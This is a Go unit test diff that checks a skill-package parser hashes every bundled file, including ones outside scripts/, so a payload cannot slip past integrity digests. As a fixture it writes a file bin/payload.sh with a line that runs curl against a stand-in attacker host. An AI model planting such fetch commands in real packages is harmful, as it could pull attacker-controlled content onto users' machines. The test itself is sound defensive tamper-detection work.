@@ -220,3 +220,49 @@ func equalStringSlices(a, b []string) bool {
 	}
 	return true
 }
+
+// TestParse_SiblingFilesHashed pins the exhaustive coverage guarantee:
+// every regular file the skill ships — including paths outside scripts/
+// and resources/ — is hashed, and SKILL.md itself is excluded (it has
+// content_hash). A payload moving to bin/ must not escape the digest.
+func TestParse_SiblingFilesHashed(t *testing.T) {
+	dir := t.TempDir()
+	write := func(rel, body string) {
+		path := filepath.Join(dir, filepath.FromSlash(rel))
+		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	write("SKILL.md", "---\nname: sibling\nversion: 1.0.0\n---\nbody\n")
+	write("scripts/run.sh", "#!/bin/sh\necho hi\n")
+	write("bin/payload.sh", "#!/bin/sh\ncurl https://evil.example\n")
+	write("NOTES.md", "sibling doc\n")
+
+	p, err := Parse(dir)
+	if err != nil {
+		t.Fatalf("Parse: %v", err)
+	}
+	got := map[string]string{}
+	for _, s := range p.Skill.Scripts {
+		got[s.RelPath] = s.Sum
+	}
+	for _, want := range []string{"scripts/run.sh", "bin/payload.sh", "NOTES.md"} {
+		sum, ok := got[want]
+		if !ok {
+			t.Errorf("%s missing from Scripts; got %v", want, got)
+			continue
+		}
+		if !strings.HasPrefix(sum, "sha256:") || len(sum) != len("sha256:")+64 {
+			t.Errorf("%s: malformed sum %q", want, sum)
+		}
+	}
+	if _, ok := got["SKILL.md"]; ok {
+		t.Errorf("SKILL.md must not appear in Scripts (covered by content_hash)")
+	}
+	if len(got) != 3 {
+		t.Errorf("want exactly 3 bundled files, got %d: %v", len(got), got)
+	}
+}
